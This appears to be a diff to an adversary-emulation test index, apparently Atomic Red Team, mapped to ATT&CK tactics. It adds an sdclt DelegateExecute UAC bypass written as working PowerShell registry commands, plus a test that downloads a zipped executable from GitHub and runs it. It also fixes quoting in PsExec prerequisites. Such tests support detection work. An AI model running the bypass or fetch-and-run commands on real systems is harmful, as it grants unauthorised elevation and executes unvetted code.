@@ -6074,6 +6074,30 @@ defense-evasion:
         cleanup_command: |
           rd "\\?\C:\Windows \" /S /Q >nul 2>nul
           del "c:\testbypass.exe" >nul 2>nul
+    - name: Bypass UAC using sdclt DelegateExecute
+      description: "Bypasses User Account Control using a fileless method, registry
+        only. \nUpon successful execution, sdclt.exe will spawn cmd.exe to spawn notepad.exe\n[Reference
+        - sevagas.com](http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass)\nAdapted
+        from [MITRE ATT&CK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/stepFourteen_bypassUAC.ps1)\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        command.to.execute:
+          description: Command to execute
+          type: string
+          default: cmd.exe /c notepad.exe
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          New-Item -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Value '#{command.to.execute}'
+          New-ItemProperty -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute"
+          Start-Process -FilePath $env:windir\system32\sdclt.exe
+          Start-Sleep -s 3
+        cleanup_command: 'Remove-Item -Path "HKCU:\Software\Classes\Folder" -Recurse
+          -Force -ErrorAction Ignore
+
+'
   T1191:
     technique:
       x_mitre_data_sources:
@@ -11254,6 +11278,39 @@ defense-evasion:
           -Name #{registry_entry_storage}
 
 '
+    - name: Execution from Compressed File
+      description: 'Mimic execution of compressed executable. When successfully executed,
+        calculator.exe will open.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        exe_payload:
+          description: EXE to execute
+          type: Path
+          default: "%temp%\\temp_T1027.zip\\T1027.exe"
+        url_path:
+          description: url to download Exe
+          type: url
+          default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027/bin/T1027.zip
+      dependency_executor_name: powershell
+      elevation_required: true
+      dependencies:
+      - description: T1027.exe must exist on disk at specified location
+        prereq_command: 'if (Test-Path #{exe_payload}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          Invoke-WebRequest "#{url_path}" -OutFile "$env:temp\T1027.zip"
+          Expand-Archive -path "$env:temp\T1027.zip" -DestinationPath "$env:temp\temp_T1027.zip\"
+      executor:
+        name: command_prompt
+        command: '"#{exe_payload}"
+
+'
+        cleanup_command: |
+          taskkill /f /im calculator.exe >nul 2>nul
+          rmdir /S /Q %temp%\temp_T1027.zip >nul 2>nul
+          del /Q "%temp%\T1027.zip" >nul 2>nul
   T1502:
     technique:
       x_mitre_data_sources:
@@ -14605,6 +14662,30 @@ privilege-escalation:
         cleanup_command: |
           rd "\\?\C:\Windows \" /S /Q >nul 2>nul
           del "c:\testbypass.exe" >nul 2>nul
+    - name: Bypass UAC using sdclt DelegateExecute
+      description: "Bypasses User Account Control using a fileless method, registry
+        only. \nUpon successful execution, sdclt.exe will spawn cmd.exe to spawn notepad.exe\n[Reference
+        - sevagas.com](http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass)\nAdapted
+        from [MITRE ATT&CK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/stepFourteen_bypassUAC.ps1)\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        command.to.execute:
+          description: Command to execute
+          type: string
+          default: cmd.exe /c notepad.exe
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          New-Item -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Value '#{command.to.execute}'
+          New-ItemProperty -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute"
+          Start-Process -FilePath $env:windir\system32\sdclt.exe
+          Start-Sleep -s 3
+        cleanup_command: 'Remove-Item -Path "HKCU:\Software\Classes\Folder" -Recurse
+          -Force -ErrorAction Ignore
+
+'
   T1038:
     technique:
       x_mitre_permissions_required:
@@ -26629,7 +26710,7 @@ execution:
       dependencies:
       - description: PsExec tool from Sysinternals must exist on disk at specified
           location (#{psexec_exe})
-        prereq_command: if (Test-Path "#{psexec_exe}"") { exit 0} else { exit 1}
+        prereq_command: if (Test-Path "#{psexec_exe}") { exit 0} else { exit 1}
         get_prereq_command: |-
           Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
           Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
@@ -28153,7 +28234,7 @@ lateral-movement:
       dependencies:
       - description: PsExec tool from Sysinternals must exist on disk at specified
           location (#{psexec_exe})
-        prereq_command: if (Test-Path "#{psexec_exe}"") { exit 0} else { exit 1}
+        prereq_command: if (Test-Path "#{psexec_exe}") { exit 0} else { exit 1}
         get_prereq_command: |-
           Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
           Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
